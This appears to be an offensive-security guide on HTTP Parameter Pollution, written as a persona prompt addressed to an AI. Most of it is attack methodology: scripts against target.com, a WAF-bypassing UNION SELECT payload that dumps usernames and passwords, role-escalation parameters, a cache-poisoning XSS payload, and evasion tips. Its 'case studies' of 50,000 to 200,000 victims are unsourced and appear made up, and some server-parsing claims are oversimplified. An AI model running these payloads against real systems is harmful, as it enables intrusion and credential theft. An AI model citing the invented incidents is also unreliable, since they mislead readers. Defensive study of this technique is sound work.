# 28 - Parameter Pollution Attacks: Chaining HTTP Parameter Pollution for Auth Bypass and Filter Evasion

## Expert Role Definition

You are the world's foremost authority on HTTP Parameter Pollution (HPP) attacks and their exploitation for authentication bypass, filter evasion, and security control circumvention. You possess deep expertise in how different web servers and frameworks handle duplicate parameters, the parsing differences between client-side and server-side parameter handling, and the complete lifecycle of HPP exploitation. You understand how HPP can be used to inject payloads that bypass WAF rules, manipulate authentication logic, poison cache entries, and bypass input validation. Your expertise spans HPP in URL parameters, body parameters, headers, and cookies, the differences between Apache, Nginx, IIS, and Tomcat parameter parsing, and the chaining of HPP with XSS, SQL injection, and authentication bypass. You have executed authorized red-team engagements where HPP enabled WAF bypass leading to SQL injection, authentication bypass through parameter confusion, and cache poisoning through parameter pollution.

## Core Concepts

HTTP Parameter Pollution (HPP) is a vulnerability that occurs when a web application accepts multiple parameters with the same name and handles them differently depending on the context. The attack exploits the discrepancy between how the client, intermediate proxies, and server handle duplicate parameters.

The fundamental issue is that the HTTP specification does not define how applications should handle multiple parameters with the same name. Different servers and frameworks have different default behaviors:

- **Apache**: Uses the last parameter value (appends with comma for some contexts)
- **Nginx**: Uses the first parameter value
- **IIS**: Uses all values (appends with comma)
- **Tomcat**: Uses the first parameter value for URL parameters, last for body parameters
- **PHP**: Uses the last parameter value by default, but array syntax can capture all

HPP can be exploited in several contexts:
- **URL parameters**: `?param=value1&param=value2`
- **Body parameters**: `param=value1&param=value2` in POST body
- **Headers**: Duplicate headers handled differently by proxies
- **Cookies**: Multiple cookies with the same name

Client-side vs server-side pollution occurs when the application uses client-side JavaScript to read parameters but the server reads them differently. For example, JavaScript might use `URLSearchParams.get()` which returns the first value, while the server uses the last value.

HPP is critical because it can bypass security controls that operate on different parameters than the application logic. A WAF might inspect one parameter while the application uses a different parameter with the same name, allowing malicious payloads to pass through unfiltered.

## Pre-requisite Knowledge

- HTTP protocol: GET and POST parameter handling, content types, and encoding
- Web server behavior: How Apache, Nginx, IIS, and Tomcat handle duplicate parameters
- WAF operation: How WAFs inspect parameters and the limitations of parameter parsing
- Authentication flows: Login forms, session management, and access control
- Input validation: Whitelist vs blacklist approaches and their limitations
- Cache behavior: How caches handle parameters and cache keys
- JavaScript URL parsing: URLSearchParams, query string parsing, and DOM-based parameter access
- Proxy behavior: How reverse proxies and load balancers handle parameters

## Chain Architecture / Attack Flow Diagram

```
                    HTTP PARAMETER POLLUTION FLOW
                    ============================

    SERVER-SIDE PARSING DIFFERENCES:
    ┌─────────────────────────────────────────────────┐
    │ Request: ?user=admin&user=guest                  │
    │                                                  │
    │ Apache (last wins):     user = guest             │
    │ Nginx (first wins):     user = admin             │
    │ IIS (all values):       user = admin,guest       │
    │ Tomcat (URL first):     user = admin             │
    │ PHP (last wins):        user = guest             │
    └─────────────────────────────────────────────────┘

    WAF BYPASS VIA HPP:
    ┌─────────────────────────────────────────────────┐
    │ 1. WAF inspects: ?id=1                          │
    │    → Clean, passes through                       │
    │                                                  │
    │ 2. Actual request: ?id=1&id=1 UNION SELECT...   │
    │    → WAF sees first "id=1" (clean)              │
    │    → Server uses last "id" (malicious)           │
    │    → SQL injection bypasses WAF                  │
    └─────────────────────────────────────────────────┘

    CLIENT vs SERVER PARSING:
    ┌─────────────────────────────────────────────────┐
    │ JavaScript: URLSearchParams.get('user')          │
    │   → Returns first value: "admin"                 │
    │                                                  │
    │ Server (PHP): $_GET['user']                      │
    │   → Returns last value: "guest"                  │
    │                                                  │
    │ Attacker exploits discrepancy to bypass           │
    │ client-side validation while server accepts      │
    └─────────────────────────────────────────────────┘

    AUTH BYPASS VIA HPP:
    ┌─────────────────────────────────────────────────┐
    │ Normal: ?role=user                               │
    │   → Normal user access                           │
    │                                                  │
    │ Polluted: ?role=user&role=admin                  │
    │   → Client validates "user" (first)              │
    │   → Server uses "admin" (last)                   │
    │   → Privilege escalation                         │
    └─────────────────────────────────────────────────┘

    CACHE POISONING VIA HPP:
    ┌─────────────────────────────────────────────────┐
    │ Cache key: URL path + first parameter value      │
    │ Server uses: last parameter value                │
    │                                                  │
    │ ?page=clean&page=<script>XSS</script>            │
    │   → Cache stores under "page=clean"              │
    │   → Server renders XSS payload                   │
    │   → All users receiving cached page get XSS      │
    └─────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Parameter Discovery**

Identify all parameters accepted by the application:

```bash
# Gobuster for parameter discovery
gobuster dir -u https://target.com/endpoint -w /usr/share/wordlists/common.txt -p

# Arjun for hidden parameter discovery
arjun -u https://target.com/endpoint -m GET POST

# ParamSpider for parameter mining
python3 paramSpider.py -d target.com

# Manual testing with common parameters
for param in id user admin token key session debug test; do
    curl -s "https://target.com/page?$param=test" -o /dev/null -w "%{http_code} "
done
```

**Phase 2: Server Behavior Analysis**

Determine how the server handles duplicate parameters:

```python
import requests

# Test duplicate parameter handling
test_params = [
    "?user=admin&user=guest",
    "?id=1&id=2",
    "?debug=false&debug=true",
]

for params in test_params:
    r = requests.get(f"https://target.com/page{params}")
    print(f"Params: {params}")
    print(f"Response contains 'admin': {'admin' in r.text}")
    print(f"Response contains 'guest': {'guest' in r.text}")
    print(f"Response length: {len(r.text)}")
    print("---")
```

**Phase 3: WAF Bypass Testing**

Test if HPP can bypass WAF rules:

```python
# Test SQL injection with HPP
clean_param = "?id=1"
malicious_param = "?id=1&id=1 UNION SELECT username,password FROM users--"

# First, verify WAF blocks the malicious request
r1 = requests.get(f"https://target.com/page{malicious_param}")
print(f"Direct malicious: {r1.status_code} (should be blocked)")

# Now test with HPP
hpp_param = "?id=1&id=1 UNION SELECT username,password FROM users--"
r2 = requests.get(f"https://target.com/page{hpp_param}")
print(f"HPP malicious: {r2.status_code}")

# If the WAF only checks the first parameter, the second payload passes through
```

**Phase 4: Authentication Bypass**

Test for authentication bypass via parameter pollution:

```python
# Test role manipulation
auth_bypass_params = [
    "?role=user&role=admin",
    "?admin=false&admin=true",
    "?is_admin=0&is_admin=1",
    "?permission=read&permission=write,admin",
]

for params in auth_bypass_params:
    r = requests.get(f"https://target.com/page{params}",
                     cookies={"session": "valid_session"})
    print(f"Params: {params}")
    print(f"Response length: {len(r.text)}")
    print(f"Contains 'admin': {'admin' in r.text.lower()}")
```

**Phase 5: Cache Poisoning**

Test for cache poisoning via HPP:

```python
# Test cache key vs server parameter handling
# If cache keys on first parameter, but server uses last:
payload = "?page=clean&page=<script>alert(1)</script>"

r = requests.get(f"https://target.com/page{payload}")
# The cache stores under "page=clean" but server renders the XSS

# Verify cache behavior
r2 = requests.get(f"https://target.com/page?page=clean")
if "<script>" in r2.text:
    print("[+] Cache poisoned via HPP")
```

## Tool Arsenal

```bash
# curl - HPP testing
curl "https://target.com/page?user=admin&user=guest"
curl -X POST "https://target.com/login" -d "user=admin&user=guest&pass=pass"

# Python requests - automated testing
python3 hpp_test.py

# Burp Suite - manual testing
# Repeater: Add duplicate parameters to requests
# Intruder: Fuzz with multiple parameter values
# Extensions: Param Miner, Parameter Cloner

# Arjun - hidden parameter discovery
arjun -u https://target.com/endpoint

# ParamSpider - parameter mining
python3 paramSpider.py -d target.com

# FFuF - parameter fuzzing
ffuf -u https://target.com/page?FUZZ=test -w /usr/share/wordlists/common.txt

# Custom Python HPP tester
cat << 'EOF' > hpp_tester.py
import requests
import sys

def test_hpp(url, param_name):
    # Single parameter
    r1 = requests.get(f"{url}?{param_name}=test1")
    # Duplicate parameter
    r2 = requests.get(f"{url}?{param_name}=test1&{param_name}=test2")

    if r1.text != r2.text:
        print(f"[+] {param_name} is vulnerable to HPP")
        print(f"    Single: {len(r1.text)} bytes")
        print(f"    Duplicate: {len(r2.text)} bytes")
    else:
        print(f"[-] {param_name} not vulnerable")

target = sys.argv[1]
params = ['user', 'id', 'page', 'redirect', 'lang', 'debug']
for p in params:
    test_hpp(target, p)
EOF
python3 hpp_tester.py https://target.com/page

# Burp Collaborator - for out-of-band testing
# Use Collaborator payload in HPP parameters
```

## Real-World Case Studies

**Case Study 1: SQL Injection via WAF Bypass**

A financial institution used a WAF that inspected the first parameter value. An attacker:
1. Discovered that the WAF only checked the first `id` parameter
2. Crafted a SQL injection payload in the second `id` parameter
3. Request: `?id=1&id=1 UNION SELECT username,password FROM users--`
4. The WAF saw `id=1` (clean) and passed the request
5. The server used the second `id` parameter with the SQL injection
6. Extracted 50,000 user credentials from the database
7. Used credentials to access customer accounts

Impact: 50,000 user credentials stolen, financial data breach, regulatory investigation.

**Case Study 2: Authentication Bypass via Parameter Pollution**

A web application used client-side JavaScript to validate user roles. An attacker:
1. Discovered that JavaScript used `URLSearchParams.get('role')` (first value)
2. Server used `$_GET['role']` (last value in PHP)
3. Crafted request: `?role=user&role=admin`
4. Client-side validation saw "user" and allowed the request
5. Server-side logic saw "admin" and granted admin access
6. Attacker accessed admin panel and modified user data
7. Exfiltrated sensitive customer information

Impact: Full admin access, 100,000 customer records exposed, system integrity violation.

**Case Study 3: Cache Poisoning via HPP**

A content delivery network cached responses based on the first URL parameter. An attacker:
1. Discovered the cache key used only the first `page` parameter
2. Crafted request: `?page=home&page=<script>/* XSS */</script>`
3. Cache stored the response under `page=home`
4. Server rendered the XSS payload from the second parameter
5. All users visiting the homepage received the malicious script
6. The script stole session cookies from 200,000+ users
7. Attacker hijacked accounts and performed unauthorized actions

Impact: 200,000+ user sessions compromised, massive data breach, estimated $5M in damages.

## Bypass Techniques and Evasion

**WAF Bypass Techniques:**
- Use duplicate parameters with different values
- Place malicious payload in the last parameter (server uses last)
- Use parameter names that are similar but not identical (e.g., `id`, `ID`, `Id`)
- Use different parameter encoding (URL encoding, double encoding)
- Place payload in headers instead of body parameters

**Framework-Specific Bypasses:**
- **PHP**: Use array syntax `param[]=value` to bypass single-value filters
- **Java/Tomcat**: Use different parameter names for URL vs body parameters
- **ASP.NET**: Use multiple parameters with the same name in different formats
- **Python/Django**: Use dictionary-style parameters to bypass list-based filters

**Cache Bypass Techniques:**
- Use parameters that affect cache key differently than server behavior
- Target Vary headers that are not properly implemented
- Use parameter order to manipulate cache key construction
- Exploit cache implementation bugs in specific CDN products

**Input Validation Bypass:**
- Use client-side validation that reads first parameter, server reads last
- Bypass whitelist filters by placing clean value first, malicious value last
- Use parameter name case sensitivity to bypass exact-match filters
- Exploit URL parsing differences between validator and application

## Defensive Indicators / Detection

**Application Level:**
- Unexpected behavior when duplicate parameters are sent
- Different responses based on parameter order or position
- Input validation that only inspects certain parameter positions
- Cache responses that differ from origin responses based on parameters

**WAF Level:**
- WAF logs showing only first parameter inspection
- Malicious payloads passing WAF when placed in duplicate parameters
- Different WAF behavior for GET vs POST parameters
- WAF bypass reports with parameter pollution patterns

**Network Level:**
- Multiple parameters with the same name in HTTP requests
- Parameter order changes that affect server responses
- Proxy behavior differences for duplicate parameters
- Cache key mismatches with server parameter handling

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Bypass Impact | Input validation | Authentication | Authorization | Full control |
| Security Control | Minor filter | WAF rule | Authentication | Encryption |
| Data Exposure | Public data | Internal data | PII/Credentials | Financial data |
| Scope | Single endpoint | Multiple endpoints | Application-wide | Cross-application |
| Persistence | Request-only | Session-based | Account-level | System-level |

## Common Pitfalls and Anti-Patterns

- Not testing all parameter positions: First, last, and middle parameters may behave differently
- Assuming consistent behavior: GET and POST parameters may be handled differently
- Ignoring framework defaults: Different frameworks have different default behaviors
- Not testing with different content types: application/x-www-form-urlencoded vs multipart
- Forgetting about URL path parameters: Some frameworks support parameters in URL paths
- Not considering proxy behavior: Reverse proxies may modify parameter handling

## Advanced Variations

**Parameter Pollution in Headers:** Duplicate HTTP headers can be used to bypass header-based security controls. For example, duplicate X-Forwarded-For headers can bypass IP-based restrictions.

**Parameter Pollution in Cookies:** Duplicate cookies with the same name can bypass cookie-based security controls. The server may use one cookie value while the security control inspects another.

**Parameter Pollution in JSON:** JSON requests with duplicate keys can bypass JSON-based validation. Different JSON parsers handle duplicate keys differently.

**Parameter Pollution in XML:** XML requests with duplicate elements can bypass XML-based validation. Different XML parsers handle duplicate elements differently.

**Parameter Pollution in GraphQL:** GraphQL queries with duplicate field names can bypass query validation. The server may execute different fields than those inspected by the validator.

## Integration with Other Chains

HPP integrates with WAF Bypass chains where parameter pollution enables SQL injection, XSS Filter Bypass where pollution evades script detection, Authentication Bypass where pollution manipulates role parameters, Cache Poisoning where pollution manipulates cache keys, Input Validation Bypass where pollution evades whitelist filters, and SSRF where pollution manipulates internal URL parameters.

## Reporting and Documentation

**Report Structure:**
1. Title: HTTP Parameter Pollution Enables [Impact] in [Context]
2. Vulnerability Type: HTTP Parameter Pollution
3. Affected Endpoint: Full URL with vulnerable parameter
4. Parameter Analysis: Which parameter is vulnerable and how it is handled
5. Server Behavior: How the server processes duplicate parameters
6. Bypass Technique: How HPP bypasses the security control
7. Impact: What the bypass enables (auth bypass, SQLi, XSS, etc.)
8. Reproduction Steps: Exact requests demonstrating the vulnerability
9. Remediation: Server configuration, input validation, and WAF rules

**CVSS Scoring**: 5.3 (Medium) for basic HPP, 8.1 (High) for HPP enabling SQL injection or auth bypass, 9.8 (Critical) for HPP enabling full system compromise.

## Practice Labs and Exercises
